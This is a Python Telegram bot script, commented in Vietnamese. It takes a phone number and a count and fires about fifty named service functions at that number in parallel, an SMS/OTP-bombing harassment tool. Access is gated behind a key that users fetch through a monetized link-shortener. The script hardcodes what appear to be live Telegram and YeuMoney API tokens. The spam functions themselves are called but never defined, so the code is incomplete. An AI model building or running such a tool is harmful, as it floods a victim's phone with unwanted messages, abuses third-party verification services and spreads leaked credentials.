# CRE: TRANHAI AND SEA
import requests
import concurrent.futures
import time
import secrets  # Thư viện để tạo chuỗi ngẫu nhiên an toàn
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from datetime import datetime, timedelta

# Thông tin token bot Telegram (thay bằng token của bạn)
TOKEN = "7834807188:AAHIwCflT9qY-Vhjyu22HhSKHGyHANGUZHA"

# Dictionary để lưu key và thông tin người dùng
user_keys = {}  # {user_id: {'key': key, 'expiration': expiration_date, 'verified': bool}}

# Token YeuMoney
YEUMONEY_TOKEN = "5f8ca8734e93fabf98f50400ca8744f5d929aa41768059813680cc3f52fd4b1e"

# Hàm tạo key và rút gọn URL qua YeuMoney
def generate_key_and_url(user_id):
    ngay = int(datetime.now().day)
    base_key = str(ngay * 27 + 27)
    random_str = secrets.token_hex(4)  # Chuỗi ngẫu nhiên 8 ký tự
    key = f'TMQ{base_key}-{user_id}-{random_str}'  # Key dạng TMQ54-123456789-abcd1234
    expiration_date = datetime.now().replace(hour=23, minute=59, second=0, microsecond=0)
    
    # Link gốc chứa key
    original_url = f'https://tranquankeybot.blogspot.com/2025/02/keybot.html?ma={key}'
    
    # Rút gọn link qua YeuMoney
    api_url = f"https://yeumoney.com/QL_api.php?token={YEUMONEY_TOKEN}&url={original_url}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            short_url = response.text.strip()  # Link rút gọn từ YeuMoney
        else:
            short_url = f"Lỗi API YeuMoney: {response.status_code}"
    except Exception as e:
        short_url = f"Lỗi khi rút gọn: {e}"
    
    return short_url, key, expiration_date

# Hàm kiểm tra xem key đã hết hạn chưa
def da_qua_gio_moi(expiration):
    return datetime.now() > expiration

# Hàm chạy spam
def run(phone, i):
    functions = [
        tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu,
        tgdt, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana,
        med, ghn, shop, gala, fa, cathay, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo, shop, beau, fu, lote, lon
    ]
    
    success_count = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
                success_count += 1
            except Exception as exc:
                print(f'Generated an exception: {exc}')
    return f"Spam lần {i}: Thành công {success_count}/{len(functions)} dịch vụ"

# Xử lý lệnh /sms
async def sms_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    user_id = update.effective_user.id
    args = context.args

    # Kiểm tra key hiện tại
    if user_id not in user_keys or da_qua_gio_moi(user_keys[user_id]['expiration']):
        short_url, key, expiration = generate_key_and_url(user_id)
        user_keys[user_id] = {'key': key, 'expiration': expiration, 'verified': False}
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🔑 Lấy key tại link sau:\n{short_url}\nReply tin nhắn này với key để xác thực."
        )
        return

    # Kiểm tra xác thực
    if not user_keys[user_id]['verified']:
        short_url, _, _ = generate_key_and_url(user_id)  # Tạo lại link nếu cần
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🔑 Lấy key tại link sau:\n{short_url}\nReply tin nhắn này với key để xác thực."
        )
        return

    # Kiểm tra định dạng lệnh
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="Cú pháp: /sms <sdt> <số lần spam>\nVí dụ: /sms 0123456789 5")
        return

    phone, count = args[0], args[1]
    
    try:
        count = int(count)
        if count <= 0:
            raise ValueError("Số lần spam phải lớn hơn 0!")
    except ValueError as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Lỗi: {str(e) if str(e) else 'Số lần spam phải là số nguyên!'}")
        return

    # Thực hiện spam
    await context.bot.send_message(chat_id=chat_id, text=f"🔥 Bắt đầu spam {phone} {count} lần...")
    for i in range(1, count + 1):
        result = run(phone, i)
        await context.bot.send_message(chat_id=chat_id, text=result)
        if i < count:
            for j in range(4, 0, -1):
                await context.bot.send_message(chat_id=chat_id, text=f"⏳ Chờ {j} giây để tiếp tục...")
                time.sleep(1)
    await context.bot.send_message(chat_id=chat_id, text="✅ Đã hoàn tất spam!")

# Xử lý xác thực key
async def verify_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    user_id = update.effective_user.id
    message = update.message.text.strip()

    if update.message.reply_to_message and user_id in user_keys:
        expected_key = user_keys[user_id]['key']
        if message == expected_key:
            user_keys[user_id]['verified'] = True
            await context.bot.send_message(chat_id=chat_id, text="✅ Key xác thực thành công! Bạn có thể dùng /sms ngay bây giờ.")
        else:
            await context.bot.send_message(chat_id=chat_id, text="❌ Key không đúng! Vui lòng kiểm tra lại.")
    else:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Vui lòng reply tin nhắn yêu cầu key để xác thực!")

# Hàm khởi động bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Thêm handler
    application.add_handler(CommandHandler("sms", sms_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verify_key))

    # Chạy bot
    print("Bot đang chạy...")
    application.run_polling()

if __name__ == "__main__":
    main()